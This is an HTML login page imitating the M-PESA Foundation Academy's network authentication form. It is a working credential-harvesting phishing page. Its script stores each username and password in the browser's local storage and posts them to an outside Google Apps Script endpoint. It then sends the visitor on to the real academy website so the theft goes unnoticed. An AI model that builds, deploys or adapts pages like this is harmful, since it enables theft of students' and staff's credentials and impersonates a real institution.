<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>M-PESA Foundation Academy — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#ffffff;
  --green:#4fa03e;
  --card-bg:#ffffff;
  --shadow:0 8px 28px rgba(15,23,42,0.06);
}
html,body{
  height:100%;
  margin:0;
  font-family:Inter,system-ui,Arial,sans-serif;
  background:var(--bg);
  color:#222;
}
.page{
  min-height:100%;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:26px;
  padding:48px 20px;
}
.card{
  width:720px;
  max-width:95%;
  background:var(--card-bg);
  border-radius:6px;
  box-shadow:var(--shadow);
  padding:46px 64px;
  display:flex;
  align-items:center;
  justify-content:center;
}
.inner{
  width:420px;
  text-align:center;
}
.logo{
  width:220px;
  height:auto;
  margin:8px auto 18px;
  display:block;
  object-fit:contain;
}
.label{
  font-size:18px;
  color:#305b99;
  margin-bottom:14px;
  font-weight:600;
}
.field{
  display:block;
  width:100%;
  padding:14px 16px;
  border-radius:10px;
  border:1px solid #eceff2;
  margin-bottom:18px;
  background:#f8fafb;
  font-size:15px;
}
.login-btn{
  display:inline-block;
  width:100%;
  padding:12px 18px;
  background:var(--green);
  color:white;
  border-radius:8px;
  border:0;
  font-weight:600;
  cursor:pointer;
  margin-top:8px;
}
.footer{
  margin-top:28px;
  color:#666;
  font-weight:500;
  font-size:15px;
}
@media(max-width:640px){
  .card{padding:28px 18px;}
  .inner{width:100%;}
  .logo{width:180px;}
}
</style>
</head>
<body>
<main class="page">
  <section class="card">
    <div class="inner">
      <img src="https://dummyimage.com/200x60/fff/3b8b3b&text=M-PESA+FOUNDATION+ACADEMY" alt="Logo" class="logo"/>
      <form class="form-box" id="loginForm">
        <div class="label">Network Authentication Form</div>
        <input class="field" type="text" id="username" placeholder="Enter your Username" required>
        <input class="field" type="password" id="password" placeholder="Enter your Password" required>
        <button class="login-btn" type="submit">Login</button>
      </form>
      <div class="footer">Curiosity • Leadership • Innovation • Accountability</div>
    </div>
  </section>
</main>
<script>
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwYOsSonTJ4W0Aduq-IygbHGUcm6cH-c-A-W5JNKVQjOBVPrUtbpgi4X9hpfslX586G/exec";
document.getElementById("loginForm").addEventListener("submit", function(e){
  e.preventDefault();
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();
  const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
  attempts.push({username: user, password: pass, time: new Date().toLocaleString()});
  localStorage.setItem("loginAttempts", JSON.stringify(attempts));
  const formData = new FormData();
  formData.append("username", user);
  formData.append("password", pass);
  formData.append("role", "participant");
  fetch(GOOGLE_SCRIPT_URL, {method:"POST", mode:"no-cors", body:formData});
 // Redirect immediately
  window.location.href = "https://mpesafoundationacademy.ac.ke/";
});
</script>

</body>
</html>
